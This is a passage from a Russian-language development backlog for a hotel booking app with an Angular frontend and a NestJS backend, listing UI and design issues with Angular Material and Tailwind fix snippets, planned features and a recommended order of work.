Класс один на все сообщения — и на свои, и на ответы поддержки. Ни выравнивания по сторонам, ни разных цветов, ни имени автора, ни времени (только дата, см. [L-4](#l-4-даты-выводятся-сырыми-iso-строками)). `msg.author` в DTO есть и не используется.

**Что делать:** сравнивать `msg.author` с id текущего пользователя:
```html
[class]="isMine(msg) ? 'self-end bg-[var(--mat-sys-primary-container)] text-[var(--mat-sys-on-primary-container)]'
                     : 'self-start bg-[var(--mat-sys-surface-container-high)]'"
```
плюс `mat-icon`/аватар автора, время `| date:'HH:mm'`, автоскролл вниз при новом сообщении.

---

### 🟠 Важно для внешнего вида

#### ✅ D-3. Тема — стоковая, без айдентики
[styles.scss:17-18](hotelBooking_angular_front/src/styles.scss#L17-L18) — `primary: mat.$azure-palette, tertiary: mat.$blue-palette`. Это дефолтная пара из схематика Angular Material. Для отельного продукта холодный сине-голубой — нейтральный и безликий выбор; конкуренты в этой нише работают тёплой палитрой (терракота, песок, глубокий изумруд) с акцентом на фотографии.

**Что делать:** сгенерировать собственную палитру из брендового цвета:
```scss
@use '@angular/material' as mat;

html {
  @include mat.theme((
    color: (
      theme-type: light,
      primary: mat.define-palette-from-color(#0f766e),   // или свой бренд-цвет
      tertiary: mat.$orange-palette,
    ),
    typography: (plain-family: Inter, brand-family: 'Playfair Display'),
    density: 0,
  ));
}
```
M3 сам сгенерирует все 60+ токенов (`--mat-sys-primary-container`, `--mat-sys-surface-container-low` и т.д.) — это бесплатное повышение визуального качества.

---

#### ✅ D-4. Нет тёмной темы, хотя M3 её отдаёт даром
[styles.scss:30](hotelBooking_angular_front/src/styles.scss#L30) — `color-scheme: light` жёстко. Комментарий прямо над строкой подсказывает `light dark`, но этим не воспользовались.

**Что делать:** `color-scheme: light dark` + `theme-type: color-scheme` в `mat.theme()` — тёмная тема заработает автоматически по системной настройке. Дополнительно — переключатель в тулбаре через `MatSlideToggle`. Блокер: сначала нужно убрать хардкод цветов Tailwind (см. [D-8](#d-8-хардкод-цветов-tailwind-мимо-токенов-m3)).

---

#### ✅ D-5. Нативные `<input type="date">` вместо MatDatepicker
[hotels.html:18,23](hotelBooking_angular_front/src/app/pages/hotels/hotels.html#L18) и [hotel-details.html:12,17](hotelBooking_angular_front/src/app/pages/hotel-details/hotel-details.html#L12) используют нативный инпут внутри `mat-form-field`.

**Проблемы:**
- Календарь рисует ОС — на Windows, macOS, Android и iOS он выглядит по-разному и не имеет ничего общего с Material.
- Нельзя заблокировать занятые даты (а это ключевая фича бронирования).
- Нельзя показать диапазон «заезд — выезд» одним контролом.
- Нет ограничения «выезд не раньше заезда».
- Даёт баг с часовыми поясами ([S-28](#s-28-даты-формируются-через-toisostring--сдвиг-на-день)).

**Что делать:** `MatDatepicker`, а для пары дат — `mat-date-range-input` + `mat-date-range-picker`. Это канонический Material-паттерн именно для бронирования:
```html
<mat-form-field appearance="outline">
  <mat-label>Даты проживания</mat-label>
  <mat-date-range-input [rangePicker]="picker" [min]="today" [dateFilter]="isDateAvailable">
    <input matStartDate formControlName="dateStart" placeholder="Заезд">
    <input matEndDate formControlName="dateEnd" placeholder="Выезд">
  </mat-date-range-input>
  <mat-datepicker-toggle matIconSuffix [for]="picker" />
  <mat-date-range-picker #picker />
</mat-form-field>
```
`@angular/material-moment-adapter` для этого уже установлен ([S-17](#s-17-устаревшие-и-неиспользуемые-зависимости)) — либо задействовать его, либо взять нативный адаптер.

---

#### ⬜ D-6. Карточка отеля не продаёт
[hotels.html:34-45](hotelBooking_angular_front/src/app/pages/hotels/hotels.html#L34-L45) — картинка, заголовок, описание, кнопка «Details». Нет цены, рейтинга, звёзд, города, удобств, отметки «осталось 2 номера». Карточка не кликабельна целиком (только текстовая кнопка), нет hover-эффекта, нет focus-состояния.

**Что делать:**
- `<mat-card appearance="outlined">` — в M3 outlined-карточки в сетке выглядят чище, чем elevated.
- Ховер: `transition-shadow hover:shadow-lg` + лёгкий `scale` на картинке.
- Удобства — `mat-chip-set` с `mat-chip` (`Wi-Fi`, `Завтрак`, `Парковка`).
- Рейтинг — строка иконок `star` + число.
- Цена — крупно, `--mat-sys-title-large`, справа в футере карточки.
- Градиентный оверлей на нижней части фото под название — стандартный приём для travel-карточек.
- Вся карточка как ссылка (`routerLink` на `mat-card`), кнопка — как вторичное действие.

---

#### ✅ D-7. Загрузка контента прыгает
Везде один паттерн: `@if (loading) { <mat-spinner /> } @if (!loading) { <контент> }` ([hotels.html:28-32](hotelBooking_angular_front/src/app/pages/hotels/hotels.html#L28-L32), [admin-hotels.html:50-54](hotelBooking_angular_front/src/app/pages/admin-hotels/admin-hotels.html#L50-L54), [support.html:9-13](hotelBooking_angular_front/src/app/pages/support/support.html#L9-L13) и т.д.). Контент полностью заменяется центрированным спиннером, потом возвращается — макет дёргается на каждый рефреш.

**Что делать:** скелетоны карточек той же высоты (Tailwind `animate-pulse` + `--mat-sys-surface-container`) либо тонкий `<mat-progress-bar mode="indeterminate">` под тулбаром, не убирая контент.

---

#### ✅ D-8. Хардкод цветов Tailwind мимо токенов M3
`bg-teal-100`, `ring-teal-500`, `bg-gray-50` ([support.html:75,28,77](hotelBooking_angular_front/src/app/pages/support/support.html#L75)), `border-gray-300`, `hover:bg-gray-50` ([admin-hotels.html:33](hotelBooking_angular_front/src/app/pages/admin-hotels/admin-hotels.html#L33), [admin-rooms.html:50](hotelBooking_angular_front/src/app/pages/admin-rooms/admin-rooms.html#L50)).

Teal не входит в azure-палитру темы — акцент выделения обращения не совпадает ни с одним цветом приложения. Любая смена темы или тёмный режим эти цвета не затронут.

**Что делать:** пробросить системные токены в Tailwind, чтобы утилиты и Material говорили на одном языке:
```js
// tailwind.config.js
theme: {
  extend: {
    colors: {
      primary:    'var(--mat-sys-primary)',
      'on-primary':'var(--mat-sys-on-primary)',
      surface:    'var(--mat-sys-surface)',
      'surface-container': 'var(--mat-sys-surface-container)',
      outline:    'var(--mat-sys-outline-variant)',
      error:      'var(--mat-sys-error)',
    },
    borderRadius: { card: 'var(--mat-sys-corner-large)' },
  },
}
```
После этого `bg-surface-container` работает и в светлой, и в тёмной теме.

---

#### ⬜ D-9. Бронирование просится в MatStepper
Сейчас бронирование — это два оторванных date-инпута над списком номеров и кнопка «Забронировать» на карточке ([hotel-details.html](hotelBooking_angular_front/src/app/pages/hotel-details/hotel-details.html)). Нет подтверждения, нет сводки, нет цены, нет количества ночей. Клик по кнопке сразу создаёт бронь и уводит на другую страницу ([reservations.effects.ts:53-56](hotelBooking_angular_front/src/app/effects/reservations.effects.ts#L53-L56)).

**Что делать:** `MatStepper`: «Даты» → «Выбор номера» → «Подтверждение» со сводкой (отель, номер, даты, ночей, итог) и финальной кнопкой. Слайс `booking` из [S-4](#s-4-мёртвый-ngrx-слайс-booking) как раз для этого и создавался.

---

#### ✅ D-10. Сайдбар не адаптивен
[shell.html:2](hotelBooking_angular_front/src/app/layout/shell/shell.html#L2) — `<mat-sidenav mode="side" opened class="w-72">` без единого брейкпоинта. 288 px панель всегда открыта, включая экран телефона, где остаётся ~80 px на контент. Кнопки-гамбургера в тулбаре нет.

**Что делать:** `BreakpointObserver` из `@angular/cdk/layout`:
```ts
readonly isHandset$ = inject(BreakpointObserver).observe(Breakpoints.Handset)
  .pipe(map(r => r.matches));
```
```html
<mat-sidenav [mode]="(isHandset$ | async) ? 'over' : 'side'" [opened]="!(isHandset$ | async)">
```
плюс `<button mat-icon-button (click)="drawer.toggle()"><mat-icon>menu</mat-icon></button>` в тулбаре.

---

#### ✅ D-11. Тулбар почти пустой и дублирует сайдбар
[shell.html:79-88](hotelBooking_angular_front/src/app/layout/shell/shell.html#L79-L88) — распорка, email и кнопка «Выйти», которая уже есть в сайдбаре ([:61](hotelBooking_angular_front/src/app/layout/shell/shell.html#L61)). Заголовка текущей страницы нет, брендинга нет.

**Что делать:** слева — название раздела (из `router` data), справа — `mat-menu` по клику на аватар (`Профиль`, `Настройки`, `Выйти`), убрать дубль кнопки выхода. Аватар — инициалы пользователя в круге с `--mat-sys-primary-container`.

---

### 🟡 Средне

#### 🟡 D-12. Типографика не использует шкалу M3
Везде Tailwind-утилиты: `text-2xl font-semibold` для h1 ([hotels.html:3](hotelBooking_angular_front/src/app/pages/hotels/hotels.html#L3), [admin-hotels.html:3](hotelBooking_angular_front/src/app/pages/admin-hotels/admin-hotels.html#L3) и во всех остальных), `text-lg`, `text-sm`, `text-xs`. Типографическая шкала M3 (`--mat-sys-display-small`, `--mat-sys-headline-medium`, `--mat-sys-title-large`, `--mat-sys-body-medium`, `--mat-sys-label-small`) не задействована нигде, хотя `mat.theme()` её генерирует.

**Последствие:** заголовки страниц и заголовки внутри `mat-card` живут в разных шкалах, вертикальный ритм плавает от страницы к странице.

**Что делать:** классы-обёртки поверх токенов (`.page-title { font: var(--mat-sys-headline-medium); }`) либо расширить `fontSize` в Tailwind этими же переменными.

> **Сделано:** в [styles.scss](hotelBooking_angular_front/src/styles.scss) заведены
> `.page-title`, `.page-sub`, `.page-eyebrow` поверх системных токенов M3 — заголовки
> всех страниц приведены к одной шкале.
>
> **Осталось:** внутри карточек и таблиц по-прежнему используются Tailwind-утилиты
> (`text-sm`, `text-base`), а не токены `--mat-sys-body-*` / `--mat-sys-label-*`.

---

#### ✅ D-13. `!important` борется со стилями Material
[hotels.html:36-43](hotelBooking_angular_front/src/app/pages/hotels/hotels.html#L36-L43) — `!h-64 !w-full !object-cover`, `!p-4 !flex-grow`, `!text-lg !mb-2`, `!px-4 !py-2`. [admin-hotels.html:64](hotelBooking_angular_front/src/app/pages/admin-hotels/admin-hotels.html#L64) — `!flex !flex-col !justify-between !h-full`.

Это признак того, что Tailwind preflight и внутренние стили Material конфликтуют, и конфликт решается силой. Такая вёрстка ломается при каждом обновлении Angular Material.

**Что делать:** настраивать компоненты через `mat.card-overrides()` / `mat.button-overrides()` — официальный API кастомизации M3, вместо перебивания CSS.

---

#### ✅ D-14. Нарушена структура `mat-card`
[admin-hotels.html:64-70](hotelBooking_angular_front/src/app/pages/admin-hotels/admin-hotels.html#L64-L70) и [admin-rooms.html:78-87](hotelBooking_angular_front/src/app/pages/admin-rooms/admin-rooms.html#L78-L87) вкладывают `<mat-card-header>` и `<mat-card-actions>` **внутрь** `<mat-card-content>`. По спецификации это соседние элементы карточки.

**Последствие:** двойные отступы, `align="end"` у actions работает не так, как ожидается, карточки в сетке разной высоты.

---

#### ⬜ D-15. Ручная пагинация вместо `mat-paginator`
[admin-users.html:232-248](hotelBooking_angular_front/src/app/pages/admin-users/admin-users.html#L232-L248) и [manager-users.html:112-128](hotelBooking_angular_front/src/app/pages/manager-users/manager-users.html#L112-L128) — самодельные «Previous / N users / Next». Нет номера страницы, нет общего количества, нет выбора размера страницы.

**Что делать:** `<mat-paginator [length]="total" [pageSize]="50" [pageSizeOptions]="[10,25,50,100]">`. На страницах «Отели», «Мои брони», «Все брони» и «Поддержка» пагинации нет вовсе.

---

#### ✅ D-16. Таблицы без сортировки, липкой шапки и адаптива
[manager-reservations.html:19](hotelBooking_angular_front/src/app/pages/manager-reservations/manager-reservations.html#L19) — `mat-table` без `matSort`, без `sticky` на заголовке, без `mat-row` hover. На мобильном таблица из 7 колонок просто уезжает в горизонтальный скролл.

**Что делать:** `matSort` + `mat-sort-header`, `<tr mat-header-row *matHeaderRowDef="cols; sticky: true">`, на узких экранах — переключение на карточки.

---

#### ✅ D-17. Пустые состояния без структуры
«Отели не найдены» ([admin-hotels.html:74](hotelBooking_angular_front/src/app/pages/admin-hotels/admin-hotels.html#L74)), «Нет номеров в этом отеле» ([admin-rooms.html:91](hotelBooking_angular_front/src/app/pages/admin-rooms/admin-rooms.html#L91)), «Нет активных обращений» ([support.html:21](hotelBooking_angular_front/src/app/pages/support/support.html#L21)) — просто серый текст. Исключение — [admin-users.html:148-156](hotelBooking_angular_front/src/app/pages/admin-users/admin-users.html#L148-L156), где есть иконка и кнопка (но иконка сломана инлайновым размером).

**Что делать:** единый компонент `EmptyState`: иконка 48px с `--mat-sys-outline`, заголовок `title-medium`, пояснение `body-medium`, кнопка основного действия.

---

#### ⬜ D-18. Формы создания/редактирования разворачиваются в потоке страницы
[admin-hotels.html:14-48](hotelBooking_angular_front/src/app/pages/admin-hotels/admin-hotels.html#L14-L48) и [admin-rooms.html:35-65](hotelBooking_angular_front/src/app/pages/admin-rooms/admin-rooms.html#L35-L65) вставляют форму карточкой над списком, сдвигая всё вниз. При редактировании нижнего элемента списка форма появляется вне зоны видимости — пользователь не понимает, что произошло.

**Что делать:** `MatDialog` для создания/редактирования либо `MatSidenav` в режиме `over` справа (паттерн detail-panel).

---

#### ✅ D-19. Загрузка файлов — самодельный `<label>` с Bootstrap-подобными классами
[admin-hotels.html:33-37](hotelBooking_angular_front/src/app/pages/admin-hotels/admin-hotels.html#L33-L37), [admin-rooms.html:50-54](hotelBooking_angular_front/src/app/pages/admin-rooms/admin-rooms.html#L50-L54) — `border border-gray-300 rounded px-4 py-2 hover:bg-gray-50`. Не совпадает ни с одной кнопкой Material в приложении. Нет drag-and-drop, нет прогресса загрузки, нет удаления отдельной картинки (только «Заменить фото» — заменяет все сразу), нет валидации размера на клиенте.

**Что делать:** `<button mat-stroked-button (click)="fileInput.click()">` + скрытый input; превью — сеткой с крестиком удаления на каждой (`mat-mini-fab` с `close`); dropzone через `cdkDropList`.

---

#### ✅ D-20. Иконки: устаревший набор и внешний CDN
[index.html:15](hotelBooking_angular_front/src/index.html#L15) подключает `Material Icons` (легаси-набор) с Google Fonts. M3 использует **Material Symbols**. Оба шрифта грузятся с внешнего CDN — рендер-блокирующий запрос, зависимость от внешнего сервиса, невозможность работы офлайн.

**Что делать:** перейти на Material Symbols, самохостить шрифты (`@fontsource/roboto`, `material-symbols`) — заодно уйдут `preconnect`-хинты.

---

#### ✅ D-21. Контраст текста ниже нормы
`opacity-70`, `opacity-60`, `opacity-50`, `opacity-80` применяются к основному тексту по всему приложению: подзаголовки страниц, описания отелей ([hotels.html:40](hotelBooking_angular_front/src/app/pages/hotels/hotels.html#L40)), описания номеров, даты сообщений (`opacity-50`), подсказки пустых состояний.

`opacity-50` на тёмном тексте по светлому фону даёт контраст около 2.5:1 при минимуме WCAG AA 4.5:1.

**Что делать:** вместо прозрачности использовать семантический токен `--mat-sys-on-surface-variant`, который в M3 уже подобран с гарантированным контрастом.

---

#### ⬜ D-22. Нет анимаций и обратной связи на переходах
`provideAnimationsAsync()` подключён, но никаких анимаций в приложении нет: переходы между роутами мгновенные, карточки появляются без stagger, сайдбар не анимирован (`mode="side"` его и не анимирует), у кликабельных карточек нет `mat-ripple`.

**Что делать:** `@angular/animations` для fade-in списков, `matRipple` на кликабельных карточках, view transitions API через `withViewTransitions()` в `provideRouter`.

---

### 🟢 Легко

#### ✅ D-23. Кнопки без иконок там, где иконка очевидна
«Reload» / «Обновить» ([hotels.html:6](hotelBooking_angular_front/src/app/pages/hotels/hotels.html#L6), [reservations.html:6](hotelBooking_angular_front/src/app/pages/reservations/reservations.html#L6), [manager-reservations.html:6](hotelBooking_angular_front/src/app/pages/manager-reservations/manager-reservations.html#L6)) — текстом. Достаточно `mat-icon-button` с `refresh` и `matTooltip`.

---

#### ✅ D-24. `mat-raised-button` для второстепенных действий
«Reload»/«Обновить» оформлены как `mat-raised-button color="primary"` — визуально это главное действие страницы, хотя таковым не является (на странице отелей главное — поиск). В M3 для такого случая — `mat-stroked-button` или `mat-icon-button`.

---

#### ✅ D-25. `MatTooltip` не используется нигде
Иконочные кнопки удаления/редактирования в админке и пагинации без подсказок.

---

#### ⬜ D-26. Нет `MatBadge` на разделах с новыми событиями
Пункт «Поддержка» в сайдбаре ([shell.html:21,36](hotelBooking_angular_front/src/app/layout/shell/shell.html#L21)) не показывает количество непрочитанных обращений, хотя поле `readAt` на бэкенде есть и отслеживается ([support.provider.ts:85](hotelBooking_nest_back/src/Providers/support.provider.ts#L85)).

---

#### 🟡 D-27. Максимальная ширина контента 1152px при сайдбаре 288px
[shell.html:90](hotelBooking_angular_front/src/app/layout/shell/shell.html#L90) — `max-w-6xl mx-auto p-4`. На широком мониторе получается узкая колонка, смещённая вправо от сайдбара, с большими пустыми полями по краям. Сетка отелей при этом всего в 2 колонки (`md:grid-cols-2`), хотя место есть на 3–4.

> **Сделано:** ширина контента поднята до 1240 px; сетки переведены на
> `repeat(auto-fill, minmax(300px, 1fr))` — на широком экране получается 3–4 колонки
> вместо фиксированных двух.
>
> **Осталось:** на мониторах шире 1600 px по краям всё ещё остаются большие поля.
> Решается либо контейнером пошире для табличных разделов, либо переносом
> фильтров в боковую колонку.

---

#### ⬜ D-28. Логотипа нет
[shell.html:4](hotelBooking_angular_front/src/app/layout/shell/shell.html#L4) — текст «Hotel Booking» шрифтом `text-lg font-semibold`. Favicon дефолтный от Angular CLI ([L-3](#l-3-дефолтные-метаданные-страницы)).

---

## 📋 Планируемые фичи

Перенесено из предыдущей версии бэклога, приоритеты уточнены.

### Фронтенд

- **F-1. Socket.IO-клиент** 🔴 — без него чат поддержки нерабочий ([C-13](#c-13-чат-поддержки-обращается-к-несуществующим-rest-эндпоинтам)). Подключиться к namespace `support`, обрабатывать `message`, `createRequest`, `messagesRead`.
- **F-2. Пагинация** 🟠 — отели, брони менеджера, обращения загружаются целиком.
- **F-3. Рабочие фильтры поиска отелей** 🟠 — сейчас поле поиска пишет term в стор, но запрос уходит только по кнопке ([L-6](#l-6-форма-поиска-отелей-ничего-не-ищет-по-кнопке-enter-корректно)).
- **F-4. Проверка доступности номера** 🟠 — связано с [V-2](#v-2-нет-проверки-пересечения-дат-при-бронировании) и [D-5](#d-5-нативные-date-инпуты-вместо-matdatepicker).
- **F-5. Галерея изображений номера** 🟡 — сейчас показывается только `images[0]` ([hotel-details.html:28](hotelBooking_angular_front/src/app/pages/hotel-details/hotel-details.html#L28)).
- **F-6. Управление отдельными изображениями** 🟡 — сейчас только «заменить все».
- **F-7. Страница профиля** 🟡 — просмотр и редактирование своих данных, смена пароля.
- **F-8. Страницы 404 / 403** 🟡 — см. [S-7](#s-7-нет-страниц-404403).
- **F-9. Three.js** 🟢 — 3D-визуализация отелей.

### Бэкенд

- **F-10. Эндпоинт занятых дат номера** 🟠 — нужен для блокировки дат в datepicker.
- **F-11. Soft delete** 🟡 — см. [S-11](#s-11-жёсткий-отказ-вместо-мягкого-удаления).
- **F-12. Запрет сообщений в закрытую заявку** 🟡 — `makeInactiveRequest` ставит `isActive: false`, но `sendMessage` этого не проверяет ([support.provider.ts:98](hotelBooking_nest_back/src/Providers/support.provider.ts#L98)).
- **F-13. Whisper AI + Web Speech API** 🟢 — голосовой ввод в поддержке.
- **F-14. Hugging Face** 🟢 — модерация сообщений.
- **F-15. Hyperledger Fabric** 🟢 — блокчейн-подтверждение брони.
- **F-16. Python-аддон Time-series ML** 🟢 — анализ загруженности.

### Инфраструктура

- **F-17. Redis** 🟠 — rate limiting ([C-10](#c-10-нет-rate-limiting-на-аутентификации)), adapter для Socket.IO при масштабировании, blacklist refresh-токенов ([C-6](#c-6-refresh-токен-подписан-тем-же-секретом-и-принимается-как-access-токен)). Подробности в [README](README.md#redis-точки-роста).
- **F-18. CI** 🟡 — линт, сборка, тесты на PR. Сейчас тесты фронта в принципе не запускаются ([V-17](#v-17-тесты-фронтенда-невозможно-запустить)).
- **F-19. Рабочий Docker-compose** 🔴 — см. [C-16](#c-16-docker-сборка-нерабочая).

---

## 🖼 Доработки по итогам прототипа

Прототип интерфейса собран и прокликан. Ниже — что в нём осталось «добротным, но не солидным».
Пункты касаются визуальной подачи и не пересекаются с функциональными D-1…D-28 выше.

#### ⬜ D-29. Страница поиска начинается сразу с формы — нет героя
Сейчас первое, что видит гость, — карточка с полями ввода. Это интерфейс инструмента, а не витрина.
Отельные сервисы открываются образом места, потому что решение о поездке эмоциональное, а не табличное.

**Что делать:**
- Широкий герой-блок на всю ширину контента: фотография, поверх неё — поисковая форма на полупрозрачной подложке.
- Под поиском — горизонтальная лента подборок: «К морю», «На выходные», «С баней», «Для командировки».
  Это готовые фильтры, а не декорация: клик подставляет параметры поиска.
- Заголовок в герое — не «Поиск отелей», а обещание («Двадцать три отеля от Калининграда до Владивостока»).

Осторожно с масштабом: гигантский герой на пол-экрана — типовое решение, которое старит макет.
Достаточно 320–380 px высоты с формой, наезжающей на нижнюю границу фотографии.

---

#### ⬜ D-30. Админка слишком «воздушная» для рабочего инструмента
Плотность в M3 стоит `density: 0` ([styles.scss](hotelBooking_angular_front/src/styles.scss)), и одинакова везде.
Гость смотрит на пять карточек и выбирает — админ работает со списком из сотни строк.
В админских таблицах вертикальный ритм расходуется впустую: на экран помещается 5–6 записей.

**Что делать:**
- `density: -2` для админских разделов через `mat.table-overrides()` / локальный `mat.theme()` на контейнере —
  строка сжимается с 52 до 40 px, на экран влезает вдвое больше.
- Inline-редактирование вместо диалога для однополевых правок (цена, «в продаже»): клик по ячейке → поле →
  Enter сохраняет. Диалог оставить для создания и полного редактирования.
- Массовые операции: чекбоксы в строках, панель действий появляется при выделении.
- Закрепить первую колонку при горизонтальном скролле (`position: sticky` на `td:first-child`).

---

#### ⬜ D-31. Интерфейс статичен — нет ни одной микроанимации
`provideAnimationsAsync()` подключён, но не используется ([S-22](#s-22-логирование-и-обработка-ошибок-отсутствуют) — соседняя проблема).
Переходы между разделами мгновенные, карточки появляются рывком, у кликабельных элементов нет отклика.

**Что делать:**
- Каскадное появление карточек в сетке: `@stagger(40ms)` — заметно оживляет первый экран.
- Переходы между шагами бронирования: сдвиг по горизонтали в сторону движения.
- `matRipple` на кликабельных карточках отелей и номеров — сейчас отклика на клик нет вообще.
- View Transitions API через `withViewTransitions()` в `provideRouter` для смены разделов.

Мера важна: перебор с анимацией читается как шаблонность. Ограничиться четырьмя перечисленными,
все с `prefers-reduced-motion` и длительностью не больше 250 мс.

---

#### ⬜ D-32. Карточка отеля не даёт принять решение
В прототипе есть цена, рейтинг и чипы удобств — этого хватает для сравнения, но не для выбора.
Гость уходит на страницу отеля, не получив ответа на «как там на самом деле».

**Что делать:**
- Галерея с миниатюрами на странице отеля вместо одной фотографии
  (сейчас в проде показывается только `images[0]`, см. [F-5](#планируемые-фичи)).
- Карта с точкой отеля и расстояниями до значимых мест («до моря 200 м», «до вокзала 3 км»).
- Блок отзывов: средняя оценка по критериям (чистота, расположение, персонал) + три последних текста.
- Индикатор дефицита на карточке — «остался 1 номер на эти даты». Данные для этого уже считаются
  в `getReservationsInTime`, нужно только вернуть количество вместо булева признака (см. [V-1](#v-1-занятость-отеля-считается-по-магическому-числу-2)).

---

#### ⬜ D-33. Плитки статистики у менеджера — плоские числа
Четыре плитки показывают значение на текущий момент без всякого контекста.
«8 броней» — это много или мало? Выросло или упало? Управленческого смысла в таком числе нет.

**Что делать:**
- Дельта к прошлому периоду под каждым числом: `+12% к июлю` зелёным, `−4%` приглушённым красным.
- Спарклайн на 30 дней в подложке плитки — тонкая линия с заливкой и подсвеченной последней точкой.
- Плитка выручки — самая важная, дать ей двойную ширину и более крупный шрифт, остальные три сжать.
- Кликабельность: клик по «Ждут оплаты» фильтрует таблицу под плитками по этому статусу.

Цвет для дельт брать из семантической группы (`--success` / `--danger`), не из акцентной латуни —
иначе акцент перестаёт работать как акцент.

---

## Рекомендуемый порядок работ

1. **Безопасность-минимум:** C-1, C-2, C-9, C-3, C-4, C-5 — закрывают все доступные извне векторы.
2. **Видимые поломки:** C-12, C-13, C-14, C-15 — то, на что пользователь наткнётся в первые минуты.
3. **Дизайн-быстрые победы:** D-1 (переписать две страницы), D-2 (чат), D-3 + D-8 (палитра и токены) — максимальный визуальный эффект при малом объёме работ.
4. **Корректность данных:** V-1, V-2, V-3, V-15 — бизнес-логика бронирования.
5. **Инфраструктура и производительность:** V-7, V-8, C-16, S-21.
6. **Долг:** остальные S-пункты, унификация архитектуры (S-1, S-2, S-3).
